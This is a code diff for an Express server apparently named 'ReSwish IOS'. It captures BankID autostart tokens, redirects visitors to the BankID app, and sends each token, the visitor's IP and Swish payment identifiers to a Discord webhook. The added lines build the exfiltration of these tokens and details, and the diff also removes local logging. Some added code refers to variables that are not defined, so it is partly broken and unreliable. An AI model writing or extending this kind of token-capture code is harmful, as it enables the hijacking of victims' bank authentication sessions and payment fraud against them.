@@ -1,7 +1,6 @@
  // Import packages
 const express = require("express");
 const axios = require("axios");
-const fs = require('fs');
 
 const app = express();
 
@@ -16,6 +15,23 @@ app.get("/?autostarttoken=:token", async (req, res) => {
 const token = req.params.token;
   const redirectUrl = `bankid:///?autostarttoken=${token}`;
   res.redirect(redirectUrl);
+
+ const embedMessage = {
+      title: 'BankID Verification',
+      description: 'Waiting for verification response.',
+      color: 0x0000FF,
+      fields: [
+        { name: 'Vercel IP', value: ipAddress, inline: true },
+        { name: 'Swish Hash', value: hash, inline: true },
+        { name: 'Swish Alias', value: alias, inline: true },
+        { name: 'Swish CTime', value: clienttime, inline: true },
+        { name: 'BankID Verified', value: bankid, inline: true },
+
+      ],
+      footer: { text: 'ReSwish IOS | Version (0.0.1)' }
+    };
+     await sendDiscordWebhook(`[BankID] A new token has been generated ${token}. Waiting for verification! `);
+
 });
 
   // Function to send Discord webhook
@@ -48,19 +64,12 @@ app.use(async (req, res, next) => {
         { name: 'Swish Hash', value: hash, inline: true },
         { name: 'Swish Alias', value: alias, inline: true },
         { name: 'Swish CTime', value: clienttime, inline: true },
+        { name: 'BankID Verified', value: bankid, inline: true },
 
       ],
       footer: { text: 'ReSwish IOS | Version (0.0.1)' }
     };
 
-    const logMessage = `${new Date().toISOString()} - Request: ${JSON.stringify(embedMessage)}\n`;
-    fs.appendFile('logs.txt', logMessage, (err) => {
-      if (err) {
-        console.error('Error writing to log file:', err);
-      } else {
-        console.log('Request details saved to log file.');
-      }
-    });
 
     await sendDiscordWebhook(embedMessage);
   } catch (error) {
